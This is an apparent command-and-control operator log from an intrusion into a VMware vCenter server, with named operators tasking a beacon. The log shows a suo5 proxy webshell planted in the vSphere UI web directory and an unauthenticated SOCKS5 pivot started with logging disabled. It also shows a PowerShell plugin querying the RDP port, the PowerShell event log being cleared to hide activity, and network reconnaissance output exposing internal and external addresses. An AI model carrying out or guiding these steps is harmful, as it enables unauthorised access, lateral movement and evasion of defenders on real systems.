+01/12 01:28:17 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\2\0\h5ngc.war\ (from File Browser)
+01/12 01:28:17 UTC [checkin] host called home, sent: 90 bytes
+01/12 01:28:17 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\2\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:28:17 UTC [checkin] host called home, sent: 100 bytes
+01/12 01:28:19 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\1\0\h5ngc.war\ (from File Browser)
+01/12 01:28:19 UTC [checkin] host called home, sent: 90 bytes
+01/12 01:28:20 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\1\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:28:20 UTC [checkin] host called home, sent: 100 bytes
+01/12 01:28:22 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\0\0\h5ngc.war\ (from File Browser)
+01/12 01:28:22 UTC [checkin] host called home, sent: 90 bytes
+01/12 01:28:23 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\0\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:28:23 UTC [checkin] host called home, sent: 100 bytes
+01/12 01:29:13 UTC [input] <jiao> upload E:\HackTools\d代理\HTTP代理\suo5\sulogin.jspx (C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\0\0\h5ngc.war\resources\sulogin.jspx)
+01/12 01:29:13 UTC [task] <> Tasked beacon to upload E:\HackTools\d代理\HTTP代理\suo5\sulogin.jspx as C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\0\0\h5ngc.war\resources\sulogin.jspx
+01/12 01:29:13 UTC [indicator] file: f9841e4e5752c3c3528fc21a493848cc 22529 bytes C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\0\0\h5ngc.war\resources\sulogin.jspx
+01/12 01:29:13 UTC [task] <> Tasked beacon to list files in C:\usr\lib\vmware-vsphere-ui\server\work\deployer\s\global\0\0\h5ngc.war\resources\ (from File Browser)
+01/12 01:29:13 UTC [checkin] host called home, sent: 22736 bytes
+01/12 01:31:20 UTC [input] <ajie> ls
+01/12 01:31:20 UTC [task] <> Tasked beacon to list files in .
+01/12 01:31:20 UTC [checkin] host called home, sent: 19 bytes
+01/12 01:31:20 UTC [output]
+C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin\*
+D	0	01/11/2024 21:47:31	.
+D	0	01/11/2024 21:47:31	..
+F	19456	01/11/2024 20:20:46	chinese.exe
+F	1121	04/09/2018 13:41:56	heapsize_wrapper.bat
+F	6427136	01/11/2024 21:47:45	help.exe
+F	20783	07/17/2023 10:11:29	hs_err_pid10560.log
+F	4473	04/09/2018 13:41:56	InstallPerfCharts.bat
+F	4475	04/09/2018 13:41:56	QueryPerfCharts.bat
+F	185852	07/17/2023 10:11:29	replay_pid10560.log
+F	4475	04/09/2018 13:41:56	StartPerfCharts.bat
+F	4475	04/09/2018 13:41:56	StopPerfCharts.bat
+F	4475	04/09/2018 13:41:56	UninstallPerfCharts.bat
+F	640952	04/09/2018 13:42:18	wrapper.exe
+
+
+01/12 01:31:31 UTC [input] <ajie> socks 53876 SOCKS5 enableNoAuth "" "" disableLogging
+01/12 01:31:31 UTC [output]
+started SOCKS5 server on: 53876
+
+01/12 01:31:31 UTC [checkin] host called home, sent: 16 bytes
+01/12 01:32:44 UTC [output]
+-------------------------------------------------------------查询RDP端口-------------------------------------------------------------
+
+01/12 01:32:44 UTC [task] <T1086, T1064> Tasked beacon to import: E:\HackTools\Shell管理\CS\插件\谢公子插件\powershell\RegRdpPort.ps1
+01/12 01:32:44 UTC [checkin] host called home, sent: 500 bytes
+01/12 01:32:44 UTC [task] <T1086, T1093> Tasked beacon to run: RegRdpPort (unmanaged)
+01/12 01:32:44 UTC [checkin] host called home, sent: 137234 bytes
+01/12 01:32:44 UTC [task] <T1059> Tasked beacon to run: wevtutil cl "Windows PowerShell"
+01/12 01:32:44 UTC [checkin] host called home, sent: 166 bytes
+01/12 01:32:46 UTC [output]
+received output:
+RDP-Tcp PortNumber:  3389
+
+
+01/12 01:33:33 UTC [input] <ajie> shell netstat -ano
+01/12 01:33:33 UTC [task] <T1059> Tasked beacon to run: netstat -ano
+01/12 01:33:33 UTC [checkin] host called home, sent: 43 bytes
+01/12 01:33:33 UTC [output]
+received output:
+
+活动连接
+
+  协议  本地地址          外部地址        状态           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4544
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       3164
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       800
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       3164
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4544
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:514            0.0.0.0:0              LISTENING       10580
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       3164
+  TCP    0.0.0.0:1514           0.0.0.0:0              LISTENING       10580
+  TCP    0.0.0.0:2012           0.0.0.0:0              LISTENING       3164
+  TCP    0.0.0.0:2014           0.0.0.0:0              LISTENING       3888
+  TCP    0.0.0.0:2015           0.0.0.0:0              LISTENING       3852
+  TCP    0.0.0.0:2020           0.0.0.0:0              LISTENING       3004
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       920
+  TCP    0.0.0.0:5443           0.0.0.0:0              LISTENING       5528
+  TCP    0.0.0.0:7080           0.0.0.0:0              LISTENING       3824
+  TCP    0.0.0.0:7444           0.0.0.0:0              LISTENING       3824
+  TCP    0.0.0.0:8109           0.0.0.0:0              LISTENING       10580
+  TCP    0.0.0.0:8900           0.0.0.0:0              LISTENING       3528
+  TCP    0.0.0.0:9443           0.0.0.0:0              LISTENING       5576
+  TCP    0.0.0.0:12080          0.0.0.0:0              LISTENING       4960
+  TCP    0.0.0.0:13080          0.0.0.0:0              LISTENING       6420
+  TCP    0.0.0.0:15774          0.0.0.0:0              LISTENING       8724
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       504
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       984
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1720
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       928
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1644
+  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       648
+  TCP    0.0.0.0:49711          0.0.0.0:0              LISTENING       632
+  TCP    10.11.0.16:80          10.11.0.16:64767       ESTABLISHED     4544
+  TCP    10.11.0.16:139         0.0.0.0:0              LISTENING       4
+  TCP    10.11.0.16:389         10.11.0.16:49410       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:49411       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:49640       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:49717       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:49894       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:49895       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:50055       ESTABLISHED     3164
+  TCP    10.11.0.16:389         10.11.0.16:50156       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:50402       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:50649       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:50650       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:50919       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:51127       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:51198       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:51360       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:51584       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:51824       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:52050       TIME_WAIT       0
+  TCP    10.11.0.16:389         10.11.0.16:52455       ESTABLISHED     3164
+  TCP    10.11.0.16:443         10.11.0.6:49402        TIME_WAIT       0
+  TCP    10.11.0.16:443         10.11.0.16:50237       ESTABLISHED     4544
+  TCP    10.11.0.16:443         10.11.0.16:51616       FIN_WAIT_2      4544
+  TCP    10.11.0.16:443         10.11.0.16:51670       ESTABLISHED     4544
+  TCP    10.11.0.16:443         10.11.0.16:61805       ESTABLISHED     4544
+  TCP    10.11.0.16:443         10.11.0.16:63122       ESTABLISHED     4544
+  TCP    10.11.0.16:443         111.193.133.58:7387    ESTABLISHED     4544
+  TCP    10.11.0.16:443         111.193.133.58:7730    TIME_WAIT       0
+  TCP    10.11.0.16:445         61.153.236.62:3771     ESTABLISHED     4
+  TCP    10.11.0.16:2014        10.11.0.16:50628       ESTABLISHED     3888
+  TCP    10.11.0.16:49407       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:49409       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:49411       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:49637       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:49639       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:49641       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:49671       100.100.154.78:80      TIME_WAIT       0
+  TCP    10.11.0.16:49736       100.100.45.106:80      TIME_WAIT       0
+  TCP    10.11.0.16:49893       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:49894       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:49896       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50055       10.11.0.16:389         ESTABLISHED     7608
+  TCP    10.11.0.16:50066       100.100.45.186:80      TIME_WAIT       0
+  TCP    10.11.0.16:50154       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50155       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50157       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50237       10.11.0.16:443         ESTABLISHED     10636
+  TCP    10.11.0.16:50391       20.198.162.76:443      ESTABLISHED     928
+  TCP    10.11.0.16:50399       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50400       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50403       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50432       100.100.154.78:80      TIME_WAIT       0
+  TCP    10.11.0.16:50628       10.11.0.16:2014        ESTABLISHED     10636
+  TCP    10.11.0.16:50647       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50649       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50651       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50820       100.100.154.78:80      TIME_WAIT       0
+  TCP    10.11.0.16:50916       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50918       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:50920       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51125       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51126       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51128       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51158       100.100.154.78:80      TIME_WAIT       0
+  TCP    10.11.0.16:51224       100.100.45.106:80      TIME_WAIT       0
+  TCP    10.11.0.16:51358       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51359       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51361       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51499       100.100.45.186:80      TIME_WAIT       0
+  TCP    10.11.0.16:51582       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51583       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51585       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51616       10.11.0.16:443         CLOSE_WAIT      4960
+  TCP    10.11.0.16:51670       10.11.0.16:443         ESTABLISHED     10636
+  TCP    10.11.0.16:51822       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51823       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51825       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:51856       100.100.154.78:80      TIME_WAIT       0
+  TCP    10.11.0.16:52047       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:52049       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:52052       10.11.0.16:389         TIME_WAIT       0
+  TCP    10.11.0.16:52121       110.42.189.52:81       SYN_SENT        14680
+  TCP    10.11.0.16:52455       10.11.0.16:389         ESTABLISHED     7608
+  TCP    10.11.0.16:58921       20.198.162.78:443      ESTABLISHED     412
+  TCP    10.11.0.16:58974       100.100.30.25:80       ESTABLISHED     11040
+  TCP    10.11.0.16:59037       100.100.167.126:443    ESTABLISHED     1384
+  TCP    10.11.0.16:61805       10.11.0.16:443         ESTABLISHED     10856
+  TCP    10.11.0.16:62285       10.11.0.6:80           ESTABLISHED     10948
+  TCP    10.11.0.16:62330       10.11.0.12:80          CLOSE_WAIT      10948
+  TCP    10.11.0.16:62338       10.11.0.12:80          CLOSE_WAIT      10948
+  TCP    10.11.0.16:62344       10.11.0.12:80          CLOSE_WAIT      10948
+  TCP    10.11.0.16:62345       10.11.0.12:80          CLOSE_WAIT      10948
+  TCP    10.11.0.16:62346       10.11.0.12:80          CLOSE_WAIT      10948
+  TCP    10.11.0.16:62347       10.11.0.12:80          CLOSE_WAIT      10948
+  TCP    10.11.0.16:62348       10.11.0.12:80          CLOSE_WAIT      10948
+  TCP    10.11.0.16:63122       10.11.0.16:443         ESTABLISHED     8908
+  TCP    10.11.0.16:63774       10.11.0.16:443         TIME_WAIT       0
+  TCP    10.11.0.16:64767       10.11.0.16:80          ESTABLISHED     4484
+  TCP    10.11.0.16:65183       10.11.0.16:443         TIME_WAIT       0
+  TCP    127.0.0.1:80           127.0.0.1:50496        ESTABLISHED     4544
+  TCP    127.0.0.1:80           127.0.0.1:50511        ESTABLISHED     4544
+  TCP    127.0.0.1:80           127.0.0.1:50570        ESTABLISHED     4544
+  TCP    127.0.0.1:5090         0.0.0.0:0              LISTENING       5528
+  TCP    127.0.0.1:5432         0.0.0.0:0              LISTENING       4848
+  TCP    127.0.0.1:5432         127.0.0.1:50116        ESTABLISHED     4848
+  TCP    127.0.0.1:5432         127.0.0.1:50119        ESTABLISHED     4848
+  TCP    127.0.0.1:5432         127.0.0.1:50654        ESTABLISHED     4848
+  TCP    127.0.0.1:5432         127.0.0.1:50659        ESTABLISHED     4848
+  TCP    127.0.0.1:5432         127.0.0.1:50663        ESTABLISHED     4848
+  TCP    127.0.0.1:5432         127.0.0.1:50666        ESTABLISHED     4848
+  TCP    127.0.0.1:5432         127.0.0.1:50672        ESTABLISHED     4848
+  TCP    127.0.0.1:5432         127.0.0.1:58351        ESTABLISHED     4848
+  TCP    127.0.0.1:8006         0.0.0.0:0              LISTENING       10856
+  TCP    127.0.0.1:8006         127.0.0.1:50262        ESTABLISHED     10856
+  TCP    127.0.0.1:8006         127.0.0.1:51694        ESTABLISHED     10856
+  TCP    127.0.0.1:8085         0.0.0.0:0              LISTENING       8908
+  TCP    127.0.0.1:8085         127.0.0.1:50593        ESTABLISHED     8908
+  TCP    127.0.0.1:8085         127.0.0.1:50977        ESTABLISHED     8908
+  TCP    127.0.0.1:8089         0.0.0.0:0              LISTENING       8908
+  TCP    127.0.0.1:8190         0.0.0.0:0              LISTENING       10636
+  TCP    127.0.0.1:8191         0.0.0.0:0              LISTENING       10636
+  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       5576
+  TCP    127.0.0.1:10080        0.0.0.0:0              LISTENING       7608
+  TCP    127.0.0.1:10080        127.0.0.1:63055        ESTABLISHED     7608
+  TCP    127.0.0.1:10080        127.0.0.1:64769        TIME_WAIT       0
+  TCP    127.0.0.1:12346        0.0.0.0:0              LISTENING       4484
+  TCP    127.0.0.1:12346        127.0.0.1:64765        ESTABLISHED     4484
+  TCP    127.0.0.1:15005        0.0.0.0:0              LISTENING       5316
+  TCP    127.0.0.1:15007        0.0.0.0:0              LISTENING       10412
+  TCP    127.0.0.1:15579        0.0.0.0:0              LISTENING       8724
+  TCP    127.0.0.1:16666        0.0.0.0:0              LISTENING       11220
+  TCP    127.0.0.1:18090        0.0.0.0:0              LISTENING       5808
+  TCP    127.0.0.1:18091        0.0.0.0:0              LISTENING       5828
+  TCP    127.0.0.1:22000        0.0.0.0:0              LISTENING       10636
+  TCP    127.0.0.1:22100        0.0.0.0:0              LISTENING       10636
+  TCP    127.0.0.1:31000        127.0.0.1:32000        ESTABLISHED     3824
+  TCP    127.0.0.1:32000        0.0.0.0:0              LISTENING       3844
+  TCP    127.0.0.1:32000        127.0.0.1:31000        ESTABLISHED     3844
+  TCP    127.0.0.1:49466        127.0.0.1:8085         TIME_WAIT       0
+  TCP    127.0.0.1:49702        127.0.0.1:49703        ESTABLISHED     3824
+  TCP    127.0.0.1:49703        127.0.0.1:49702        ESTABLISHED     3824
+  TCP    127.0.0.1:49704        127.0.0.1:49705        ESTABLISHED     3824
+  TCP    127.0.0.1:49705        127.0.0.1:49704        ESTABLISHED     3824
+  TCP    127.0.0.1:49719        127.0.0.1:49720        ESTABLISHED     5316
+  TCP    127.0.0.1:49720        127.0.0.1:49719        ESTABLISHED     5316
+  TCP    127.0.0.1:49746        127.0.0.1:49747        ESTABLISHED     4484
+  TCP    127.0.0.1:49747        127.0.0.1:49746        ESTABLISHED     4484
+  TCP    127.0.0.1:49748        127.0.0.1:49749        ESTABLISHED     4484
+  TCP    127.0.0.1:49749        127.0.0.1:49748        ESTABLISHED     4484
+  TCP    127.0.0.1:49750        127.0.0.1:49751        ESTABLISHED     4484
+  TCP    127.0.0.1:49751        127.0.0.1:49750        ESTABLISHED     4484
+  TCP    127.0.0.1:49756        127.0.0.1:49757        ESTABLISHED     4484
+  TCP    127.0.0.1:49757        127.0.0.1:49756        ESTABLISHED     4484
+  TCP    127.0.0.1:49758        127.0.0.1:49759        ESTABLISHED     4484
+  TCP    127.0.0.1:49759        127.0.0.1:49758        ESTABLISHED     4484
+  TCP    127.0.0.1:49760        127.0.0.1:49761        ESTABLISHED     4484
+  TCP    127.0.0.1:49761        127.0.0.1:49760        ESTABLISHED     4484
+  TCP    127.0.0.1:49762        127.0.0.1:49763        ESTABLISHED     4484
+  TCP    127.0.0.1:49763        127.0.0.1:49762        ESTABLISHED     4484
+  TCP    127.0.0.1:49764        127.0.0.1:49765        ESTABLISHED     4484
+  TCP    127.0.0.1:49765        127.0.0.1:49764        ESTABLISHED     4484
+  TCP    127.0.0.1:49766        127.0.0.1:49767        ESTABLISHED     4484
+  TCP    127.0.0.1:49767        127.0.0.1:49766        ESTABLISHED     4484
+  TCP    127.0.0.1:49768        127.0.0.1:49769        ESTABLISHED     4484
+  TCP    127.0.0.1:49769        127.0.0.1:49768        ESTABLISHED     4484
+  TCP    127.0.0.1:49770        127.0.0.1:49771        ESTABLISHED     4484
+  TCP    127.0.0.1:49771        127.0.0.1:49770        ESTABLISHED     4484
+  TCP    127.0.0.1:49773        127.0.0.1:49774        ESTABLISHED     4384
+  TCP    127.0.0.1:49774        127.0.0.1:49773        ESTABLISHED     4384
+  TCP    127.0.0.1:49779        127.0.0.1:49780        ESTABLISHED     4960
+  TCP    127.0.0.1:49780        127.0.0.1:49779        ESTABLISHED     4960
+  TCP    127.0.0.1:49791        127.0.0.1:49792        ESTABLISHED     4960
+  TCP    127.0.0.1:49792        127.0.0.1:49791        ESTABLISHED     4960
+  TCP    127.0.0.1:49793        127.0.0.1:49794        ESTABLISHED     4960
+  TCP    127.0.0.1:49794        127.0.0.1:49793        ESTABLISHED     4960
+  TCP    127.0.0.1:49825        127.0.0.1:49826        ESTABLISHED     5316
+  TCP    127.0.0.1:49826        127.0.0.1:49825        ESTABLISHED     5316
+  TCP    127.0.0.1:49827        127.0.0.1:49828        ESTABLISHED     5316
+  TCP    127.0.0.1:49828        127.0.0.1:49827        ESTABLISHED     5316
+  TCP    127.0.0.1:49854        127.0.0.1:49855        ESTABLISHED     3824
+  TCP    127.0.0.1:49855        127.0.0.1:49854        ESTABLISHED     3824
+  TCP    127.0.0.1:49856        127.0.0.1:49857        ESTABLISHED     3824
+  TCP    127.0.0.1:49857        127.0.0.1:49856        ESTABLISHED     3824
+  TCP    127.0.0.1:49858        127.0.0.1:49859        ESTABLISHED     3824
+  TCP    127.0.0.1:49859        127.0.0.1:49858        ESTABLISHED     3824
+  TCP    127.0.0.1:49860        127.0.0.1:49861        ESTABLISHED     3824
+  TCP    127.0.0.1:49861        127.0.0.1:49860        ESTABLISHED     3824
+  TCP    127.0.0.1:49932        127.0.0.1:49933        ESTABLISHED     5828
+  TCP    127.0.0.1:49933        127.0.0.1:49932        ESTABLISHED     5828
+  TCP    127.0.0.1:49934        127.0.0.1:49935        ESTABLISHED     5828
+  TCP    127.0.0.1:49935        127.0.0.1:49934        ESTABLISHED     5828
+  TCP    127.0.0.1:49939        127.0.0.1:49940        ESTABLISHED     5828
+  TCP    127.0.0.1:49940        127.0.0.1:49939        ESTABLISHED     5828
+  TCP    127.0.0.1:49941        127.0.0.1:49942        ESTABLISHED     5828
+  TCP    127.0.0.1:49942        127.0.0.1:49941        ESTABLISHED     5828
+  TCP    127.0.0.1:49943        127.0.0.1:49944        ESTABLISHED     5828
+  TCP    127.0.0.1:49944        127.0.0.1:49943        ESTABLISHED     5828
+  TCP    127.0.0.1:49945        127.0.0.1:49946        ESTABLISHED     5828
+  TCP    127.0.0.1:49946        127.0.0.1:49945        ESTABLISHED     5828
+  TCP    127.0.0.1:49947        127.0.0.1:49948        ESTABLISHED     5576
+  TCP    127.0.0.1:49948        127.0.0.1:49947        ESTABLISHED     5576
+  TCP    127.0.0.1:49951        127.0.0.1:49952        ESTABLISHED     5576
+  TCP    127.0.0.1:49952        127.0.0.1:49951        ESTABLISHED     5576
+  TCP    127.0.0.1:49953        127.0.0.1:49954        ESTABLISHED     5576
+  TCP    127.0.0.1:49954        127.0.0.1:49953        ESTABLISHED     5576
+  TCP    127.0.0.1:49955        127.0.0.1:49956        ESTABLISHED     5576
+  TCP    127.0.0.1:49956        127.0.0.1:49955        ESTABLISHED     5576
+  TCP    127.0.0.1:49957        127.0.0.1:49958        ESTABLISHED     5576
+  TCP    127.0.0.1:49958        127.0.0.1:49957        ESTABLISHED     5576
+  TCP    127.0.0.1:49959        127.0.0.1:49960        ESTABLISHED     5576
+  TCP    127.0.0.1:49960        127.0.0.1:49959        ESTABLISHED     5576
+  TCP    127.0.0.1:49961        127.0.0.1:49962        ESTABLISHED     5576
+  TCP    127.0.0.1:49962        127.0.0.1:49961        ESTABLISHED     5576
+  TCP    127.0.0.1:49963        127.0.0.1:49964        ESTABLISHED     5576
+  TCP    127.0.0.1:49964        127.0.0.1:49963        ESTABLISHED     5576
+  TCP    127.0.0.1:49965        127.0.0.1:49966        ESTABLISHED     5576
+  TCP    127.0.0.1:49966        127.0.0.1:49965        ESTABLISHED     5576
+  TCP    127.0.0.1:49968        127.0.0.1:49969        ESTABLISHED     5808
+  TCP    127.0.0.1:49969        127.0.0.1:49968        ESTABLISHED     5808
+  TCP    127.0.0.1:49970        127.0.0.1:49971        ESTABLISHED     5808
+  TCP    127.0.0.1:49971        127.0.0.1:49970        ESTABLISHED     5808
+  TCP    127.0.0.1:49976        127.0.0.1:49977        ESTABLISHED     5808
+  TCP    127.0.0.1:49977        127.0.0.1:49976        ESTABLISHED     5808
+  TCP    127.0.0.1:49978        127.0.0.1:49979        ESTABLISHED     5808
+  TCP    127.0.0.1:49979        127.0.0.1:49978        ESTABLISHED     5808
+  TCP    127.0.0.1:49980        127.0.0.1:49981        ESTABLISHED     5808
+  TCP    127.0.0.1:49981        127.0.0.1:49980        ESTABLISHED     5808
+  TCP    127.0.0.1:49982        127.0.0.1:49983        ESTABLISHED     5808
+  TCP    127.0.0.1:49983        127.0.0.1:49982        ESTABLISHED     5808
+  TCP    127.0.0.1:49998        127.0.0.1:49999        ESTABLISHED     4484
+  TCP    127.0.0.1:49999        127.0.0.1:49998        ESTABLISHED     4484
+  TCP    127.0.0.1:50005        127.0.0.1:50006        ESTABLISHED     4484
+  TCP    127.0.0.1:50006        127.0.0.1:50005        ESTABLISHED     4484
+  TCP    127.0.0.1:50007        127.0.0.1:50008        ESTABLISHED     4484
+  TCP    127.0.0.1:50008        127.0.0.1:50007        ESTABLISHED     4484
+  TCP    127.0.0.1:50009        127.0.0.1:50010        ESTABLISHED     4484
+  TCP    127.0.0.1:50010        127.0.0.1:50009        ESTABLISHED     4484
+  TCP    127.0.0.1:50011        127.0.0.1:50012        ESTABLISHED     4484
+  TCP    127.0.0.1:50012        127.0.0.1:50011        ESTABLISHED     4484
+  TCP    127.0.0.1:50013        127.0.0.1:50014        ESTABLISHED     4484
+  TCP    127.0.0.1:50014        127.0.0.1:50013        ESTABLISHED     4484
+  TCP    127.0.0.1:50015        127.0.0.1:50016        ESTABLISHED     4484
+  TCP    127.0.0.1:50016        127.0.0.1:50015        ESTABLISHED     4484
+  TCP    127.0.0.1:50017        127.0.0.1:50018        ESTABLISHED     4484
+  TCP    127.0.0.1:50018        127.0.0.1:50017        ESTABLISHED     4484
+  TCP    127.0.0.1:50019        127.0.0.1:50020        ESTABLISHED     4484
+  TCP    127.0.0.1:50020        127.0.0.1:50019        ESTABLISHED     4484
+  TCP    127.0.0.1:50116        127.0.0.1:5432         ESTABLISHED     7608
+  TCP    127.0.0.1:50119        127.0.0.1:5432         ESTABLISHED     7608
+  TCP    127.0.0.1:50179        127.0.0.1:50180        ESTABLISHED     7608
+  TCP    127.0.0.1:50180        127.0.0.1:50179        ESTABLISHED     7608
+  TCP    127.0.0.1:50181        127.0.0.1:50182        ESTABLISHED     7608
+  TCP    127.0.0.1:50182        127.0.0.1:50181        ESTABLISHED     7608
+  TCP    127.0.0.1:50191        127.0.0.1:50192        ESTABLISHED     7608
+  TCP    127.0.0.1:50192        127.0.0.1:50191        ESTABLISHED     7608
+  TCP    127.0.0.1:50193        127.0.0.1:50194        ESTABLISHED     7608
+  TCP    127.0.0.1:50194        127.0.0.1:50193        ESTABLISHED     7608
+  TCP    127.0.0.1:50195        127.0.0.1:50196        ESTABLISHED     7608
+  TCP    127.0.0.1:50196        127.0.0.1:50195        ESTABLISHED     7608
+  TCP    127.0.0.1:50197        127.0.0.1:50198        ESTABLISHED     7608
+  TCP    127.0.0.1:50198        127.0.0.1:50197        ESTABLISHED     7608
+  TCP    127.0.0.1:50262        127.0.0.1:8006         ESTABLISHED     4544
+  TCP    127.0.0.1:50314        127.0.0.1:50315        ESTABLISHED     5528
+  TCP    127.0.0.1:50315        127.0.0.1:50314        ESTABLISHED     5528
+  TCP    127.0.0.1:50316        127.0.0.1:50317        ESTABLISHED     5528
+  TCP    127.0.0.1:50317        127.0.0.1:50316        ESTABLISHED     5528
+  TCP    127.0.0.1:50318        127.0.0.1:50319        ESTABLISHED     5528
+  TCP    127.0.0.1:50319        127.0.0.1:50318        ESTABLISHED     5528
+  TCP    127.0.0.1:50323        127.0.0.1:50324        ESTABLISHED     5528
+  TCP    127.0.0.1:50324        127.0.0.1:50323        ESTABLISHED     5528
+  TCP    127.0.0.1:50325        127.0.0.1:50326        ESTABLISHED     5528
+  TCP    127.0.0.1:50326        127.0.0.1:50325        ESTABLISHED     5528
+  TCP    127.0.0.1:50327        127.0.0.1:50328        ESTABLISHED     5528
+  TCP    127.0.0.1:50328        127.0.0.1:50327        ESTABLISHED     5528
+  TCP    127.0.0.1:50329        127.0.0.1:50330        ESTABLISHED     5528
+  TCP    127.0.0.1:50330        127.0.0.1:50329        ESTABLISHED     5528
+  TCP    127.0.0.1:50331        127.0.0.1:50332        ESTABLISHED     5528
+  TCP    127.0.0.1:50332        127.0.0.1:50331        ESTABLISHED     5528
+  TCP    127.0.0.1:50334        127.0.0.1:50335        ESTABLISHED     5528
+  TCP    127.0.0.1:50335        127.0.0.1:50334        ESTABLISHED     5528
+  TCP    127.0.0.1:50496        127.0.0.1:80           ESTABLISHED     5316
+  TCP    127.0.0.1:50511        127.0.0.1:80           ESTABLISHED     5316
+  TCP    127.0.0.1:50521        127.0.0.1:50522        ESTABLISHED     10580
+  TCP    127.0.0.1:50522        127.0.0.1:50521        ESTABLISHED     10580
+  TCP    127.0.0.1:50565        127.0.0.1:50566        ESTABLISHED     10412
+  TCP    127.0.0.1:50566        127.0.0.1:50565        ESTABLISHED     10412
+  TCP    127.0.0.1:50567        127.0.0.1:50568        ESTABLISHED     10412
+  TCP    127.0.0.1:50568        127.0.0.1:50567        ESTABLISHED     10412
+  TCP    127.0.0.1:50570        127.0.0.1:80           ESTABLISHED     10412
+  TCP    127.0.0.1:50574        127.0.0.1:50575        ESTABLISHED     10412
+  TCP    127.0.0.1:50575        127.0.0.1:50574        ESTABLISHED     10412
+  TCP    127.0.0.1:50576        127.0.0.1:50577        ESTABLISHED     10412
+  TCP    127.0.0.1:50577        127.0.0.1:50576        ESTABLISHED     10412
